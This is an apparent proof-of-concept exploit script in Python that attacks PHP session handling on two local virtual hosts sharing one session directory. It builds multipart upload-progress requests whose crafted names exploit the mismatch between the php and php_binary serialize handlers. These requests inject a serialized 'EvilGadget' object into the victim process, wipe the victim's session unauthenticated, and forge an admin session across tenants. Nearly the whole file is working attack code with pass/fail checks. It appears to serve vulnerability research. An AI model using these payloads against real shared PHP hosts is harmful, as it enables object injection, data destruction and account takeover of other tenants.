#!/usr/bin/env python3
"""
shape10_attack.py — MISSION 10: mixed-handler crossfire ESCALATION from
data destruction to weaponizable primitives, on a shared-save_path two-
tenant host (both vhosts = php -S with per-vhost ini, one sess dir).

Shapes (each its own receipt log):
  a1  php_binary WRITER vhost + poisoned rfc1867 key -> php READER victim
      vhost: the pipe inside the persisted key turns the key bytes into a
      NAME|VALUE pair for the php reader -> php_var_unserialize runs on
      attacker serialized OBJECT bytes inside the VICTIM process
      (the A0 shape) -> EvilGadget __wakeup (decode) + __destruct
      (decode-failure destroy teardown) with attacker-chosen cmd.
  a2  php WRITER vhost (default handler, no ini control needed beyond
      cleanup=0) + no-pipe crafted name -> php_binary READER victim vhost:
      the namelen framing of php_binary lands the VALUE parse window on
      attacker object bytes 102 bytes into the name -> same detonation.
  b   wipe-to-inject: (1) unauth pipe-key multipart to the VICTIM's own php
      vhost wipes the live session (ftruncate 0); (2) unauth multipart to
      the php_binary writer vhost replaces the file with the poisoned
      php_binary content; (3) victim read detonates the gadget.
  c   cross-tenant FULL takeover via attacker tenant code
      (shape10_takeover.php): clean rewrite of the victim session (forged
      uid/role + EvilGadget) -> victim reads a CLEAN-decoded, fully
      attacker-controlled session (no warning; destruct at normal shutdown).
  ctl no-pipe control: same multipart to the victim's own php vhost with a
      pipe-free key -> session INTACT (wipe is pipe-gated).

usage: shape10_attack.py [--asan] [--keep]
"""
import argparse
import http.client
import os
import shutil
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
WP2 = os.path.dirname(HERE)
RECEIPTS = os.path.join(WP2, "receipts")
SID = "vicsid00000000000000000000000"
PLAIN = "/tmp/php8512_build/plain2/sapi/cli/php"
ASAN = "/tmp/php8512_build/asan2/sapi/cli/php"
WAKEUP = "/tmp/shape10_wakeup.marker"
DESTRUCT = "/tmp/shape10_destruct.marker"

args = None  # parsed globals
PHPBIN = PLAIN
WORK = "/tmp/shape10"


# ---------------------------------------------------------------- servers
def stop_port(port):
    subprocess.run(["pkill", "-f", f"127.0.0.1:{port}"], capture_output=True)
    for _ in range(8):
        time.sleep(0.15)
        out = subprocess.run(["ss", "-ltn"], capture_output=True, text=True).stdout
        if f":{port} " not in out:
            return
    subprocess.run(["pkill", "-9", "-f", f"127.0.0.1:{port}"], capture_output=True)
    time.sleep(0.3)


class Vhost:
    def __init__(self, name, port, handler, docroot, cleanup="1"):
        self.name, self.port, self.handler, self.docroot, self.cleanup = \
            name, port, handler, docroot, cleanup
        self.dir = os.path.join(WORK, name)
        self.proc = None
        os.makedirs(self.dir, exist_ok=True)

    def start(self, sess_dir):
        stop_port(self.port)
        ini = os.path.join(self.dir, "php.ini")
        with open(ini, "w") as f:
            f.write(f"""session.save_handler = files
session.save_path = {sess_dir}
session.serialize_handler = {self.handler}
session.use_strict_mode = 0
session.upload_progress.enabled = 1
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.upload_progress.cleanup = {self.cleanup}
session.gc_probability = 0
display_errors = 1
log_errors = 1
error_reporting = E_ALL
post_max_size = 64M
upload_max_filesize = 64M
max_file_uploads = 64
memory_limit = 1024M
""")
        env = dict(os.environ)
        log = open(os.path.join(self.dir, "server.log"), "w")
        if args.asan:
            env.update(USE_ZEND_ALLOC="0",
                       ASAN_OPTIONS="detect_leaks=0:abort_on_error=1")
            self.proc = subprocess.Popen(
                [ASAN, "-c", ini, "-S", f"127.0.0.1:{self.port}", "-t", self.docroot],
                stdout=log, stderr=log, env=env)
        else:
            self.proc = subprocess.Popen(
                [PLAIN, "-c", ini, "-S", f"127.0.0.1:{self.port}", "-t", self.docroot],
                stdout=log, stderr=log, env=env)
        for _ in range(100):
            try:
                c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=1)
                c.request("GET", "/up.php")
                c.getresponse().read()
                c.close()
                return
            except Exception:
                time.sleep(0.1)
        raise RuntimeError(f"vhost {self.name} failed to start")

    def stop(self):
        if self.proc:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except Exception:
                self.proc.kill()
            self.proc = None
        stop_port(self.port)

    def logtext(self):
        p = os.path.join(self.dir, "server.log")
        return open(p, errors="replace").read() if os.path.exists(p) else ""


# ---------------------------------------------------------------- http
def http_get(port, path, sid=SID):
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=30)
    hdr = {"Cookie": f"PHPSESSID={sid}"} if sid else {}
    c.request("GET", path, headers=hdr)
    r = c.getresponse()
    body = r.read().decode("utf-8", "replace")
    c.close()
    return body


def multipart_touch(port, name_hex, sid=SID, filesize=4096, path="/up.php"):
    """Raw multipart POST with PHP_SESSION_UPLOAD_PROGRESS=<name bytes>."""
    host, bnd = "127.0.0.1", b"Wp2Bnd2026"
    name = bytes.fromhex(name_hex)
    filedata = b"A" * filesize

    def part(n, v, fn=None):
        d = b'Content-Disposition: form-data; name="' + n + b'"'
        if fn:
            d += b'; filename="' + fn + b'"'
        return b"--" + bnd + b"\r\n" + d + b"\r\n\r\n" + v + b"\r\n"

    body = part(b"PHP_SESSION_UPLOAD_PROGRESS", name)
    body += part(b"f0", filedata, fn=b"notes.txt")
    body += b"--" + bnd + b"--\r\n"
    hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=30)
    s.sendall(hdr + body)
    data = b""
    while True:
        try:
            c = s.recv(65536)
        except Exception:
            break
        if not c:
            break
        data += c
    s.close()
    return data.split(b"\r\n", 1)[0].decode(errors="replace")


# ---------------------------------------------------------------- helpers
def sess_file(sess):
    return os.path.join(sess, f"sess_{SID}")


def fstate(sess):
    p = sess_file(sess)
    if not os.path.exists(p):
        return "MISSING"
    n = os.path.getsize(p)
    with open(p, "rb") as f:
        head = f.read(96)
    return f"{n} bytes | head: {head!r}"


def clear_markers():
    for p in (WAKEUP, DESTRUCT):
        if os.path.exists(p):
            os.remove(p)


def markers():
    out = []
    for label, p in (("WAKEUP", WAKEUP), ("DESTRUCT", DESTRUCT)):
        out.append(f"{label}: " + (open(p).read().strip() if os.path.exists(p) else "(none)"))
    return "\n".join(out)


def asan_hits(*vhosts):
    return [v.name for v in vhosts if "AddressSanitizer" in v.logtext()]


def gadgets(cmd):
    """Attacker serialized EvilGadget with chosen cmd."""
    return f'O:10:"EvilGadget":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'


def new_lab(tag):
    """Fresh shared sess dir + victim/attacker vhosts per shape."""
    sess = os.path.join(WORK, f"sess_{tag}")
    if os.path.exists(sess):
        shutil.rmtree(sess)
    os.makedirs(sess)
    return sess


def write_receipt(name, text):
    os.makedirs(RECEIPTS, exist_ok=True)
    if args and args.asan:
        name = name.replace(".log", "_asan.log")
    path = os.path.join(RECEIPTS, name)
    with open(path, "w") as f:
        f.write(text)
    print(f"    -> receipt {path}")


# ---------------------------------------------------------------- shapes
def shape_a1():
    print("== shape a1: php_binary writer -> php reader victim (A0 object injection) ==")
    tag = "a1"
    sess = new_lab(tag)
    att = Vhost("att_bin", 18801, "php_binary", os.path.join(HERE, "docroot_attacker"), cleanup="0")
    vic = Vhost("vic_php", 18802, "php", os.path.join(HERE, "docroot_victim"))
    att.start(sess); vic.start(sess)
    clear_markers()
    log = []
    try:
        login = http_get(vic.port, "/victim.php?login=1")
        log.append("[1] victim login: " + login.strip())
        log.append("[1] session file: " + fstate(sess))

        # touch #1: php-format victim file vs php_binary reader on the writer
        # vhost -> decode-failure crossfire DELETE (the file is unlinked, not
        # rewritten — WIPE2 addendum B) — receipted, then cleared for inject.
        st = multipart_touch(att.port, "41626344")
        log.append(f"[2] touch #1 (php_binary reader vs php victim file): {st}")
        log.append("[2] session file after crossfire delete: " + fstate(sess))

        # touch #2: session now empty/missing -> poisoned key persists
        name = "x|" + gadgets("pwn-xhfire-a1")
        st = multipart_touch(att.port, name.encode().hex())
        log.append(f"[3] touch #2 (inject; php_binary writer, cleanup=0): {st}")
        log.append("[3] shared session file now (php_binary format, poisoned key persisted):")
        log.append("    " + fstate(sess))

        clear_markers()
        out = http_get(vic.port, "/victim.php")
        log.append("[4] VICTIM's own read (php handler):")
        log.append(indent(out))
        log.append("[4] gadget markers (fired INSIDE the victim process):")
        log.append(indent(markers()))
        asan = asan_hits(att, vic)
        log.append(f"[5] ASAN hits: {asan or 'none'}")

        ok = os.path.exists(WAKEUP) and os.path.exists(DESTRUCT) \
            and "Failed to decode session object" in out
        log.append(f"[PASS] a1" if ok else "[FAIL] a1")
    finally:
        att.stop(); vic.stop()
    write_receipt("shape10_a1_phpbinary_writer_inject.log", "\n".join(log) + "\n")
    return log[-1].startswith("[PASS]")


def shape_a2():
    print("== shape a2: php (default) writer -> php_binary reader victim ==")
    tag = "a2"
    sess = new_lab(tag)
    att = Vhost("att_php", 18803, "php", os.path.join(HERE, "docroot_attacker"), cleanup="0")
    vic = Vhost("vic_bin", 18804, "php_binary", os.path.join(HERE, "docroot_victim_bin"))
    att.start(sess); vic.start(sess)
    clear_markers()
    log = []
    try:
        # name: 102 filler bytes so the php_binary namelen window ('u'=117)
        # lands the VALUE parse at NAME[102]; then the object; then benign
        # php_binary entries to walk the rest of the name cleanly.
        name = "A" * 102 + gadgets("pwn-xhfire-a2") + "\x01zi:7;" * 8
        st = multipart_touch(att.port, name.encode().hex())
        log.append(f"[1] unauth multipart to ATTACKER vhost (DEFAULT php handler, no-pipe key): {st}")
        log.append("[1] shared session file now (php format):")
        log.append("    " + fstate(sess))

        clear_markers()
        out = http_get(vic.port, "/victim.php")
        log.append("[2] VICTIM's own read (php_binary handler):")
        log.append(indent(out))
        log.append("[2] gadget markers (fired INSIDE the victim process):")
        log.append(indent(markers()))
        asan = asan_hits(att, vic)
        log.append(f"[3] ASAN hits: {asan or 'none'}")

        ok = os.path.exists(WAKEUP) and os.path.exists(DESTRUCT)
        log.append(f"[PASS] a2" if ok else "[FAIL] a2")
    finally:
        att.stop(); vic.stop()
    write_receipt("shape10_a2_php_writer_binreader_inject.log", "\n".join(log) + "\n")
    return log[-1].startswith("[PASS]")


def shape_b():
    print("== shape b: wipe-to-inject chain (clear victim session, replace, detonate) ==")
    tag = "b"
    sess = new_lab(tag)
    att = Vhost("att_bin", 18805, "php_binary", os.path.join(HERE, "docroot_attacker"), cleanup="0")
    vic = Vhost("vic_php", 18806, "php", os.path.join(HERE, "docroot_victim"))
    att.start(sess); vic.start(sess)
    clear_markers()
    log = []
    try:
        log.append("[1] victim login: " + http_get(vic.port, "/victim.php?login=1").strip())
        log.append("[1] session file: " + fstate(sess))

        # step 1: WIPE on the victim's own php vhost (unauth, pipe key)
        st = multipart_touch(vic.port, "4162637C4F3A3130", path="/victim.php")  # "Abc|O:10"
        log.append(f"[2] WIPE: unauth pipe-key multipart to the VICTIM vhost itself: {st}")
        log.append("[2] session file after wipe: " + fstate(sess))

        # step 2: INJECT via the php_binary writer vhost
        name = "x|" + gadgets("pwn-xhfire-b")
        st = multipart_touch(att.port, name.encode().hex())
        log.append(f"[3] INJECT: unauth multipart to the php_binary writer vhost: {st}")
        log.append("[3] session file after inject: " + fstate(sess))

        # step 3: victim read -> detonation
        clear_markers()
        out = http_get(vic.port, "/victim.php")
        log.append("[4] VICTIM read (session cleared then replaced by attacker):")
        log.append(indent(out))
        log.append("[4] gadget markers:")
        log.append(indent(markers()))
        asan = asan_hits(att, vic)
        log.append(f"[5] ASAN hits: {asan or 'none'}")

        ok = os.path.exists(WAKEUP) and os.path.exists(DESTRUCT) \
            and "Failed to decode session object" in out
        log.append(f"[PASS] b" if ok else "[FAIL] b")
    finally:
        att.stop(); vic.stop()
    write_receipt("shape10_b_wipe_to_inject.log", "\n".join(log) + "\n")
    return log[-1].startswith("[PASS]")


def shape_c():
    print("== shape c: cross-tenant FULL session takeover (shared save_path) ==")
    tag = "c"
    sess = new_lab(tag)
    att = Vhost("att_php", 18807, "php", os.path.join(HERE, "docroot_attacker"))
    vic = Vhost("vic_php", 18808, "php", os.path.join(HERE, "docroot_victim"))
    att.start(sess); vic.start(sess)
    clear_markers()
    log = []
    try:
        log.append("[1] victim login: " + http_get(vic.port, "/victim.php?login=1").strip())
        log.append("[1] session file: " + fstate(sess))

        # attacker TENANT code on the shared host adopts the victim SID
        out = http_get(att.port, "/shape10_takeover.php?sid=" + SID
                       + "&uid=attacker-admin&role=admin&cmd=pwn-via-takeover")
        log.append("[2] attacker tenant page (own code, shared save_path, strict_mode=0):")
        log.append(indent(out))
        log.append("[2] victim session file after takeover (php format, attacker-owned):")
        log.append("    " + fstate(sess))

        clear_markers()
        out = http_get(vic.port, "/victim.php")
        log.append("[3] VICTIM's next read — CLEAN decode of the attacker session:")
        log.append(indent(out))
        time.sleep(0.3)
        log.append("[3] gadget markers (wakeup at decode, destruct at normal shutdown):")
        log.append(indent(markers()))
        asan = asan_hits(att, vic)
        log.append(f"[4] ASAN hits: {asan or 'none'}")

        clean = "Failed to decode" not in out
        ok = ("uid='attacker-admin'" in out and "role='admin'" in out
              and "class=EvilGadget" in out and os.path.exists(DESTRUCT) and clean)
        log.append(f"[PASS] c" if ok else "[FAIL] c")
    finally:
        att.stop(); vic.stop()
    write_receipt("shape10_c_cross_tenant_takeover.log", "\n".join(log) + "\n")
    return log[-1].startswith("[PASS]")


def shape_ctl():
    print("== control: pipe-free key on the victim vhost -> session intact ==")
    tag = "ctl"
    sess = new_lab(tag)
    vic = Vhost("vic_php", 18809, "php", os.path.join(HERE, "docroot_victim"))
    vic.start(sess)
    log = []
    try:
        log.append("[1] victim login: " + http_get(vic.port, "/victim.php?login=1").strip())
        before = fstate(sess)
        log.append("[1] session file: " + before)
        st = multipart_touch(vic.port, "41626344")   # "AbcD" — no pipe
        log.append(f"[2] no-pipe multipart to victim vhost (cleanup=1 default): {st}")
        after = fstate(sess)
        log.append("[2] session file after: " + after)
        intact = ("uid|i:1337;" in after and "role|" in after)
        log.append("[PASS] ctl (no pipe -> no wipe; uid/role intact)" if intact
                   else "[FAIL] ctl")
    finally:
        vic.stop()
    write_receipt("shape10_control_nopipe.log", "\n".join(log) + "\n")
    return log[-1].startswith("[PASS]")


def indent(text):
    return "\n".join("    | " + l for l in text.strip().splitlines())


def main():
    global args
    ap = argparse.ArgumentParser()
    ap.add_argument("--asan", action="store_true", help="run shapes under ASAN php")
    ap.add_argument("--keep", action="store_true", help="keep work dirs")
    args = ap.parse_args()

    os.makedirs(WORK, exist_ok=True)
    results = {}
    if args.asan:
        results["a1(asan)"] = shape_a1()
        results["a2(asan)"] = shape_a2()
        results["b(asan)"] = shape_b()
    else:
        results["a1"] = shape_a1()
        results["a2"] = shape_a2()
        results["b"] = shape_b()
        results["c"] = shape_c()
        results["ctl"] = shape_ctl()

    print("\n==== shape10 summary ====")
    for k, v in results.items():
        print(f"  {k}: {'PASS' if v else 'FAIL'}")
    return 0 if all(results.values()) else 1


if __name__ == "__main__":
    sys.exit(main())
